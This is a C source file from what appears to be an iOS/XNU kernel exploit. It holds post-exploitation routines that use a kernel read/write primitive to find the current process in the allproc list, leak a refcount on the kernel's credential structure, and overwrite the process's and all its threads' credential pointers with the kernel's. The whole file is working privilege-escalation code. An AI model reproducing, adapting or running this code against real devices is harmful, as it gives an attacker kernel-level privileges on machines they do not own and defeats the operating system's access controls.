#include "post_exploit.h"
#include "log.h"
#include "offsets.h"
#include "rwx.h"

#include <stdlib.h>
#define MAX_PROCESSES_IN_SYSTEM							(0xffff)

/*
 * Function name: 	post_exploit_set_cred_for_all_threads
 * Description:		Overwrites the creds of all the threads belonging to the same proc.
 * Returns:			kern_return_t.
 */

static
kern_return_t post_exploit_set_cred_for_all_threads(void * thread, void * creds) {
	
	kern_return_t ret = KERN_SUCCESS;
	void * thread_next = NULL;
	if (0 != thread)
	{
		do {
			/* update thread's cred */
			ret = rwx_write(thread + OFFSET(struct_uthread_uu_ucred), &creds, sizeof(creds));
			if (KERN_SUCCESS != ret)
			{
				ERROR_LOG(" Error replacing credentials for thread!");
				goto cleanup;
			} else {
				DEBUG_LOG(" Replaced credentials for thread");
			}

			ret = rwx_read(thread + OFFSET(struct_uthread_uu_list), &thread_next, sizeof(thread_next));
			if (KERN_SUCCESS != ret)
			{
				ERROR_LOG(" Failed reading next thread!");
				goto cleanup;
			} else {
				DEBUG_LOG("next thread: %p", (void*)thread_next);
			}

			thread = thread_next;

		}while(0 != thread_next);
	}

cleanup:
	return ret;
}



/*
 * Function name: 	post_exploit_copy_cred
 * Description:		Copies the credentials from one proc to another.
 * Returns:			kern_return_t.
 */

static
kern_return_t post_exploit_copy_cred(void * proc_from, void * proc_to) {
	
	kern_return_t ret = KERN_SUCCESS;
	unsigned long creds_from = 0;
	unsigned long new_credentials_refcount = 0x444444;
	unsigned long uthread = 0;

	ret = rwx_read(proc_from + OFFSET(struct_proc_p_ucred), &creds_from, sizeof(creds_from));
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG(" Error reading STRUCT_PROC_P_UCRED_OFFSET");
	} else {
		DEBUG_LOG(" kernel_creds: %p", (void*)creds_from);
	}

	DEBUG_LOG(" leaking kernel creds' refcount...");

	/* leak creds */
	ret = rwx_write((void*)(creds_from + OFFSET(struct_kauth_cred_cr_ref)), &new_credentials_refcount, sizeof(new_credentials_refcount));
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG(" Error leaking credentials!");
		goto cleanup;
	} else { 
		DEBUG_LOG(" Successfully leaked credentials!");
	}

	DEBUG_LOG(" replacing credentials...");

	/* replace proc_to's credentials pointer with proc_from's credentials pointer */
	ret = rwx_write(proc_to + OFFSET(struct_proc_p_ucred), &creds_from, sizeof(creds_from));
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG(" Error replacing credentials!");
		goto cleanup;
	} else {
		DEBUG_LOG(" Successfully replaced credentials!");
	}

	DEBUG_LOG(" replacing cached credentials...");

	/* replace cached credentials */
	ret = rwx_read(proc_to + OFFSET(struct_proc_p_uthlist), &uthread, sizeof(uthread));
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG(" Error reading thread list");
		goto cleanup;
	} else {
		DEBUG_LOG(" uthread: %p", (void*)uthread);
	}

	ret = post_exploit_set_cred_for_all_threads((void*)uthread, (void*)creds_from);

cleanup:
	return ret;
}



/*
 * Function name: 	post_exploit_find_proc
 * Description:		Finds the 'proc' of the process name proc_name.
 * Returns:			kern_return_t and proc in output params.
 */

static
kern_return_t post_exploit_find_proc(const char * proc_name, void ** proc_out) {
	
	kern_return_t ret = KERN_SUCCESS;
	unsigned long proc = 0, next_proc = 0;
	unsigned int i = 0;
	char current_proc_name[16] = {0};
	ret = rwx_read((void*)(offsets_get_kernel_base() + OFFSET(all_proc)), &proc, sizeof(proc));
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("error reading allproc");
	}
	else { 
		DEBUG_LOG("allproc: %p", (void*)proc);
	}

	for(i = 0; i < MAX_PROCESSES_IN_SYSTEM; ++i) {
		memset(current_proc_name, 0, sizeof(current_proc_name));

		ret = rwx_read((void*)(proc + OFFSET(struct_proc_p_comm)), current_proc_name, sizeof(current_proc_name));
		if (KERN_SUCCESS != ret)
		{
			ERROR_LOG("failed reading process name %d", i);
			goto cleanup;
		}

		DEBUG_LOG("Iterating process name: %s", current_proc_name);

		if (strstr(current_proc_name, proc_name))
		{
			*proc_out = (void*)proc;
			goto cleanup;
		}

		ret = rwx_read((void*)proc, &next_proc, sizeof(next_proc));
		if (KERN_SUCCESS != ret)
		{
			ERROR_LOG(" error reading next_proc");
			goto cleanup;
		}

		proc = next_proc;
	}

cleanup:
	return ret;

}



/*
 * Function name: 	post_exploit_get_kernel_creds
 * Description:		Updates the credentials of the current process to the kernel's credentials.
 * Returns:			kern_return_t.
 */

kern_return_t post_exploit_get_kernel_creds() {
	
	kern_return_t ret = KERN_SUCCESS;
	void * kern_proc = NULL;
	void * self_proc = NULL;

	ret = rwx_read(offsets_get_kernel_base() + OFFSET(kern_proc), (unsigned long*)&kern_proc, sizeof(kern_proc));
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("error reading kern_proc");
		goto cleanup;
	}

	DEBUG_LOG("kern_proc: %p", kern_proc);

	ret = post_exploit_find_proc(getprogname(), &self_proc);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("error getting self proc");
		goto cleanup;
	}

	DEBUG_LOG("self_proc: %p", self_proc);

	ret = post_exploit_copy_cred(kern_proc, self_proc);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("error copying creds from kernel to us");
		goto cleanup;
	}

cleanup:
	return ret;
}

